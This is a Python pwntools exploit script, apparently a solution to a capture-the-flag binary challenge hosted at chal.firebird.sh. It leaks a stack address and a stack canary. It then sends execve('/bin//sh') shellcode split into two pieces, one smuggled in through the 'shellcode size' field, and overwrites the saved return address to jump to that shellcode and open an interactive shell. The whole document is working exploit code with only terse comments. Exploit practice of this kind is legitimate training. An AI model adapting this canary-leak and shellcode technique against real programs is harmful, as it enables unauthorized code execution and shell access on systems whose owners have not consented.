from pwn import *

# leaking
r = process("./program")

r = remote("chal.firebird.sh", 35028)
context.arch = "amd64" # always remember this before using asm()

# leaking
r.recvuntil(b'0x')
stack = int(b'0x' + r.recvuntil(b' ', drop=True), 16) # address of shellcode_size
r.recvuntil(b'0x')
canary = int(b'0x' + r.recvuntil(b' ', drop=True), 16)



shellcode1 = asm("""
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
jmp .+0x1a
""")

shellcode_size = u64(shellcode1[:8])
UwU = shellcode1[8:]

shellcode2 = asm("""
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
""")

payload = flat(
    UwU,
    p64(canary),
    b"A" * 0x8, # old_rbp
    stack,      # old_rip -> address of shellcode_size
    shellcode2
)

r.recvuntil(b"how long is your shellcode?\n")
r.sendline(str(shellcode_size).encode())

r.recvuntil(b"Show me your shellcode!\n")
r.sendline(payload)

r.interactive()
